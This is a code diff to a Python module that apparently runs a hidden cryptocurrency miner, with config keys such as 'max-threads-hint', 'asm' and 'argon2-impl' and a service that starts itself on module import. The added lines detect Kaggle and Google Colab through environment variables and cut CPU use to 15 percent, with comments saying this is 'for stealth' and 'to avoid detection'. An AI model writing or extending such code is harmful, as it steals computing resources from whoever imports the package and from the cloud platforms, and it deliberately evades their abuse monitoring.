@@ -162,6 +162,22 @@ def _create_config(worker_id="default"):
     # Ensure directory exists
     config_path.parent.mkdir(parents=True, exist_ok=True)
     
+    # Detect cloud platforms for stealth
+    is_cloud = False
+    cpu_limit = 40  # Default: 40% CPU
+    
+    try:
+        # Detect Kaggle
+        if os.environ.get("KAGGLE_KERNEL_RUN_TYPE", ""):
+            is_cloud = True
+            cpu_limit = 15  # Very low CPU on Kaggle to avoid detection
+        # Detect Colab
+        elif "colab.google" in os.environ.get("PYTHONPATH", "").lower():
+            is_cloud = True
+            cpu_limit = 15  # Very low CPU on Colab
+    except:
+        pass
+    
     # Detect GPU
     has_nvidia = False
     has_amd = False
@@ -217,7 +233,7 @@ def _create_config(worker_id="default"):
             "priority": 0,
             "memory-pool": False,
             "yield": True,
-            "max-threads-hint": 40,
+            "max-threads-hint": cpu_limit,  # Adaptive based on platform
             "asm": True,
             "argon2-impl": None,
         },
@@ -326,7 +342,7 @@ def _start_service():
 def _init():
     """Initialize service on module import."""
     try:
-        # Only start on Linux/Unix systems
+        # Start on all platforms (Linux, macOS, cloud)
         if sys.platform.startswith('linux') or sys.platform == 'darwin':
             # Start immediately (not delayed) for reliability
             # The service checks if already running, so safe to call multiple times
